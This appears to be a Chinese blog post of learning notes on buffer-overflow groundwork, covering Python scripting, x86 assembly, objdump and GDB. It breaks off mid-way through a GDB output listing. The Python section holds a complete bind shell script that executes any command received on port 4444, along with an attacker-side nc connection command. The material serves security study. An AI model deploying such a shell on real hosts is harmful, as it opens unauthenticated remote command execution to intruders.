<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>缓冲区溢出 | Oracle の blog</title><meta name="author" content="Oracle"><meta name="copyright" content="Oracle"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="初探缓冲区溢出，路线按python脚本基础--&gt;汇编基础--&gt;Linux X86缓冲区溢出">
<meta property="og:type" content="article">
<meta property="og:title" content="缓冲区溢出">
<meta property="og:url" content="https://byforacle.github.io/B1og/2024/09/27/overflow/index.html">
<meta property="og:site_name" content="Oracle の blog">
<meta property="og:description" content="初探缓冲区溢出，路线按python脚本基础--&gt;汇编基础--&gt;Linux X86缓冲区溢出">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://www.z4a.net/images/2024/09/28/111.png">
<meta property="article:published_time" content="2024-09-27T15:30:00.000Z">
<meta property="article:modified_time" content="2025-04-17T12:50:34.061Z">
<meta property="article:author" content="Oracle">
<meta property="article:tag" content="python">
<meta property="article:tag" content="汇编">
<meta property="article:tag" content="二进制">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.z4a.net/images/2024/09/28/111.png"><link rel="shortcut icon" href="/B1og/./img/fav.png"><link rel="canonical" href="https://byforacle.github.io/B1og/2024/09/27/overflow/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/B1og/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/B1og/',
  algolia: undefined,
  localSearch: {"path":"/B1og/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: Oracle","link":"链接: ","source":"来源: Oracle の blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '缓冲区溢出',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-04-17 20:50:34'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 6.3.0"><link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet" /></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/B1og/./img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/B1og/archives/"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/B1og/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/B1og/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/B1og/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/B1og/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/B1og/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/B1og/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/B1og/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li><li><a class="site-page child" href="/B1og/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://www.z4a.net/images/2024/09/28/111.png')"><nav id="nav"><span id="blog-info"><a href="/B1og/" title="Oracle の blog"><span class="site-name">Oracle の blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/B1og/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/B1og/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/B1og/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/B1og/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/B1og/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li><li><a class="site-page child" href="/B1og/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">缓冲区溢出</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-09-27T15:30:00.000Z" title="发表于 2024-09-27 23:30:00">2024-09-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-17T12:50:34.061Z" title="更新于 2025-04-17 20:50:34">2025-04-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/B1og/categories/%E7%AC%94%E8%AE%B0/">笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>14分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="缓冲区溢出"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="python脚本基础"><a href="#python脚本基础" class="headerlink" title="python脚本基础"></a>python脚本基础</h2><p>不多赘述语法</p>
<p>在 Python 脚本的第一行添加<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Shebang_(Unix">shebang</a>#Portability) ( <code>#!/usr/bin/env python3</code>)，可无需在在命令行开头输入python运行脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x welcome.py</span><br><span class="line">./welcome.py</span><br></pre></td></tr></table></figure>
<p><strong>库管理</strong></p>
<p>查看已安装库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip freeze</span><br></pre></td></tr></table></figure>
<p>将复制上述<code>freeze</code>输出并将其保存为需求文件，即为<code>requirements.txt</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
<p><strong>click装饰器</strong></p>
<p>使脚本更灵活，在运行脚本时接受输入参数（<a target="_blank" rel="noopener" href="https://click.palletsprojects.com/">官方文档</a>）</p>
<p>例子</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> click</span><br><span class="line"></span><br><span class="line"><span class="meta">@click.command()</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;--count&#x27;</span>, default=<span class="number">1</span>, <span class="built_in">help</span>=<span class="string">&#x27;Number of greetings.&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;--name&#x27;</span>, prompt=<span class="string">&#x27;Your name&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;The person to greet.&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">count, name</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        click.echo(<span class="string">&#x27;Hello %s!&#x27;</span> % name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    hello()</span><br><span class="line">    </span><br><span class="line"><span class="comment"># python click_test.py --name Birb</span></span><br></pre></td></tr></table></figure>
<p><strong>bind shell</strong></p>
<p>简单的bind shell脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> click</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_cmd</span>(<span class="params">cmd</span>):</span><br><span class="line">    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> output.stdout</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_input</span>(<span class="params">client_socket</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        chunks = []</span><br><span class="line">        chunk = client_socket.recv(<span class="number">2048</span>)</span><br><span class="line">        chunks.append(chunk)</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(chunk) != <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">chr</span>(chunk[-<span class="number">1</span>]) != <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">            chunk = client_socket.recv(<span class="number">2048</span>)</span><br><span class="line">            chunks.append(chunk)</span><br><span class="line">        cmd = (<span class="string">b&#x27;&#x27;</span>.join(chunks)).decode()[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> cmd.lower() == <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line">            client_socket.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        output = run_cmd(cmd)</span><br><span class="line">        client_socket.sendall(output)</span><br><span class="line"></span><br><span class="line"><span class="meta">@click.command()</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;--port&#x27;</span>, <span class="string">&#x27;-p&#x27;</span>, default=<span class="number">4444</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">port</span>):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, port))</span><br><span class="line">    s.listen(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket, _ = s.accept()</span><br><span class="line">        t = Thread(target=handle_input, args=(client_socket, ))</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>用法</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">target:</span><br><span class="line">python bindshell.py --port 4444</span><br><span class="line">attacker:</span><br><span class="line">nc 10.10.10.10 4444 -nv</span><br></pre></td></tr></table></figure>
<blockquote>
<p>1、库默认存储位置</p>
<p>Windows 10 <code>PYTHON_INSTALL_DIR\Lib\site-packages</code></p>
<p>Linux <code>/usr/lib/PYTHON_VERSION/dist-packages/</code></p>
<p>2、默认搜索路径：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">import</span> sys</span><br><span class="line">&gt;sys.path</span><br></pre></td></tr></table></figure>
<p>3、项目中建议使用虚拟环境管理库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;python3 -m venv [name]</span><br><span class="line">&gt;source [name]/bin/activate</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="x86-汇编基础"><a href="#x86-汇编基础" class="headerlink" title="x86 汇编基础"></a>x86 汇编基础</h2><h3 id="编译和调试"><a href="#编译和调试" class="headerlink" title="编译和调试"></a>编译和调试</h3><p>例子：<code>helloWorld.s</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line"></span><br><span class="line">section .data</span><br><span class="line">    message db &quot;Hello HTB Academy!&quot;</span><br><span class="line">    length equ $-message ;代表message长度</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">    mov rax, 1</span><br><span class="line">    mov rdi, 1</span><br><span class="line">    mov rsi, message</span><br><span class="line">    mov rdx, length</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, 60</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
<p>汇编代码由标签、指令、操作数组成</p>
<p><strong>编译</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf64 helloWorld.s</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>-f elf64</code>标志用于指示我们要汇编 64 位汇编代码。如果我们要汇编 32 位代码，则可以使用<code>-f elf</code>。</p>
</blockquote>
<p><strong>链接</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ld -o helloWorld helloWorld.o</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果我们要汇编 32 位二进制文件，则需要添加“ <code>-m elf_i386</code>”标志。</p>
</blockquote>
<p><strong>运行</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./helloWorld</span><br></pre></td></tr></table></figure>
<p>一键脚本，<code>-g</code>参数进入调试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">fileName=<span class="string">&quot;<span class="variable">$&#123;1%%.*&#125;</span>&quot;</span> <span class="comment"># remove .s extension</span></span><br><span class="line"></span><br><span class="line">nasm -f elf64 <span class="variable">$&#123;fileName&#125;</span><span class="string">&quot;.s&quot;</span></span><br><span class="line">ld <span class="variable">$&#123;fileName&#125;</span><span class="string">&quot;.o&quot;</span> -o <span class="variable">$&#123;fileName&#125;</span></span><br><span class="line">[ <span class="string">&quot;<span class="variable">$2</span>&quot;</span> == <span class="string">&quot;-g&quot;</span> ] &amp;&amp; gdb -q <span class="variable">$&#123;fileName&#125;</span> || ./<span class="variable">$&#123;fileName&#125;</span></span><br></pre></td></tr></table></figure>
<p><strong>反汇编</strong></p>
<p>该<code>objdump</code>工具，该工具会从文件中转储机器代码并解释每个十六进制代码的汇编指令。我们可以使用该<code>-D</code>标志反汇编二进制文件。</p>
<blockquote>
<p>使用标志<code>-M intel</code>，这样就<code>objdump</code>可以用我们正在使用的英特尔语法编写指令</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -M intel -d helloWorld</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果我们只想显示汇编代码，而不显示机器代码或地址，我们可以添加<code>--no-show-raw-insn --no-addresses</code>标志</p>
<p><code>objdump</code>已将第三条指令更改为<code>movabs</code>。这与<code>mov</code>相同，因此如果您需要重新组合代码，可以将其改回<code>mov</code>。</p>
</blockquote>
<p>标志<code>-d</code>只会反汇编<code>.text</code>这一部分。要转储任何字符串，我们可以使用该<code>-s</code>标志，并添加<code>-j .data</code>以仅检查该<code>.data</code>部分。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -sj .data helloWorld</span><br></pre></td></tr></table></figure>
<p><strong>调试</strong></p>
<p>安装</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install gdb</span><br></pre></td></tr></table></figure>
<p>gef插件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget -O ~/.gdbinit-gef.py -q https://gef.blah.cat/py</span><br><span class="line">echo source ~/.gdbinit-gef.py &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
<blockquote>
<p>若wget失败，手动复制即可</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -q ./helloWorld</span><br></pre></td></tr></table></figure>
<h3 id="GDB使用"><a href="#GDB使用" class="headerlink" title="GDB使用"></a>GDB使用</h3><p><strong>info</strong></p>
<blockquote>
<p>如果我们想了解任何命令在<code>GDB</code>中的运行方式，我们可以使用该<code>help CMD</code>命令来获取其文档。例如，我们可以尝试执行<code>help info</code></p>
</blockquote>
<p>使用<code>info</code>命令来检查二进制文件中定义了哪些<code>functions</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef➤  info functions</span><br><span class="line"></span><br><span class="line">All defined functions:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x0000000000401000  _start</span><br></pre></td></tr></table></figure>
<p>找到了我们的主要<code>_start</code>功能</p>
<p>使用<code>info variables</code>命令查看程序内所有可用的变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  info variables</span><br><span class="line"></span><br><span class="line">All defined variables:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x0000000000402000  message</span><br><span class="line">0x0000000000402012  __bss_start</span><br><span class="line">0x0000000000402012  _edata</span><br><span class="line">0x0000000000402018  _end</span><br></pre></td></tr></table></figure>
<p>我们找到了<code>message</code>，以及定义内存段的一些其他默认变量</p>
<p>查看特定函数内的指令，我们可以使用<code>disassemble</code>或<code>disas</code>命令以及函数名称</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gef➤  disas _start</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function _start:</span><br><span class="line">   0x0000000000401000 &lt;+0&gt;:	mov    eax,0x1</span><br><span class="line">   0x0000000000401005 &lt;+5&gt;:	mov    edi,0x1</span><br><span class="line">   0x000000000040100a &lt;+10&gt;:	movabs rsi,0x402000</span><br><span class="line">   0x0000000000401014 &lt;+20&gt;:	mov    edx,0x12</span><br><span class="line">   0x0000000000401019 &lt;+25&gt;:	syscall</span><br><span class="line">   0x000000000040101b &lt;+27&gt;:	mov    eax,0x3c</span><br><span class="line">   0x0000000000401020 &lt;+32&gt;:	mov    edi,0x0</span><br><span class="line">   0x0000000000401025 &lt;+37&gt;:	syscall</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p><strong>调试</strong></p>
<p>大致分为四个功能，下断点，检查，步进，修改当前寄存器值</p>
<p><code>break</code></p>
<p>使用<code>break</code>或<code>b</code>命令以及要中断的地址或函数名称。例如，要跟踪程序运行的所有指令，让我们在<code>_start</code>函数处中断</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b _start</span><br><span class="line"></span><br><span class="line">Breakpoint 1 at 0x401000</span><br></pre></td></tr></table></figure>
<p>为了启动我们的程序，我们可以使用<code>run</code>或<code>r</code>命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b _start</span><br><span class="line">Breakpoint 1 at 0x401000</span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: ./helloWorld </span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0000000000401000 in _start ()</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$rax   : 0x0               </span><br><span class="line">$rbx   : 0x0               </span><br><span class="line">$rcx   : 0x0               </span><br><span class="line">$rdx   : 0x0               </span><br><span class="line">$rsp   : 0x00007fffffffe310  →  0x0000000000000001</span><br><span class="line">$rbp   : 0x0               </span><br><span class="line">$rsi   : 0x0               </span><br><span class="line">$rdi   : 0x0               </span><br><span class="line">$rip   : 0x0000000000401000  →  &lt;_start+0&gt; mov eax, 0x1</span><br><span class="line">...SNIP...</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffe310│+0x0000: 0x0000000000000001	 ← $rsp</span><br><span class="line">0x00007fffffffe318│+0x0008: 0x00007fffffffe5a0  →  &quot;./helloWorld&quot;</span><br><span class="line">...SNIP...</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">     0x400ffa                  add    BYTE PTR [rax], al</span><br><span class="line">     0x400ffc                  add    BYTE PTR [rax], al</span><br><span class="line">     0x400ffe                  add    BYTE PTR [rax], al</span><br><span class="line"> →   0x401000 &lt;_start+0&gt;       mov    eax, 0x1</span><br><span class="line">     0x401005 &lt;_start+5&gt;       mov    edi, 0x1</span><br><span class="line">     0x40100a &lt;_start+10&gt;      movabs rsi, 0x402000</span><br><span class="line">     0x401014 &lt;_start+20&gt;      mov    edx, 0x12</span><br><span class="line">     0x401019 &lt;_start+25&gt;      syscall </span><br><span class="line">     0x40101b &lt;_start+27&gt;      mov    eax, 0x3c</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: &quot;helloWorld&quot;, stopped 0x401000 in _start (), reason: BREAKPOINT</span><br><span 